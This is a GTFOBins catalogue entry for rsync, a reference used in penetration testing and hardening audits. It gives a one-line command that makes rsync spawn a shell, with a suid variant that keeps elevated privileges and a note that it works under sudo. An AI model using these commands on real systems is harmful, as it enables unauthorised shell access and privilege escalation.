<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/rsync -->
---
functions:
  shell:
  - code: |-
      rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
    contexts:
      sudo:
      suid:
        code: |-
          rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
        shell: false
      unprivileged:
...
